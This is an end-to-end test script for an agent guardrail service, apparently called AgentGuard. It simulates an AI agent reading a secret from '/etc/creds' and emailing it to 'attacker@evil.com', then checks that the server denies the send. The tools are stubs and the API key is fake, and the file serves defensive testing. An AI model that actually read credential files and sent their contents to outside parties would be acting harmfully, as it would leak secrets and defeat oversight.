"""Cross-process e2e: client hits an external AgentGuard server (env-configured).

Used by docker-compose to validate the full client->server path between
containers. Exits non-zero if the exfiltration scenario is not denied.
"""
from __future__ import annotations

import os
import sys
import time
import urllib.error
import urllib.request

import _bootstrap  # noqa: F401

from agentguard import AgentGuard


def _wait_for_server(base_url: str, timeout_s: float = 30.0) -> None:
    deadline = time.time() + timeout_s
    last_err: Exception | None = None
    while time.time() < deadline:
        try:
            with urllib.request.urlopen(f"{base_url}/health", timeout=3) as resp:
                if resp.status == 200:
                    return
        except (urllib.error.URLError, OSError) as exc:
            last_err = exc
            time.sleep(1.0)
    raise SystemExit(f"server not reachable at {base_url}: {last_err}")


def main() -> int:
    base_url = os.environ.get("AGENTGUARD_SERVER_URL", "http://127.0.0.1:38080")
    _wait_for_server(base_url)
    print(f"[client] connected to {base_url}")

    guard = AgentGuard(
        session_id="docker-e2e",
        server_url=base_url,
        policy="enterprise_default",
    )

    def read_secret(path: str) -> str:
        return "API_KEY=sk-ABCDEFGH12345678"

    def send_email(to: str, body: str) -> str:
        return f"sent to {to}"

    read = guard.wrap_tool(read_secret, capabilities=["read_file"])
    send = guard.wrap_tool(send_email, capabilities=["external_send"])

    print("[client] read secret ->", read("/etc/creds"))
    result = send("attacker@evil.com", "see attached")
    print("[client] exfiltrate ->", result)

    ok = isinstance(result, dict) and result.get("decision") == "deny"
    print("[client] E2E", "PASSED" if ok else "FAILED")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
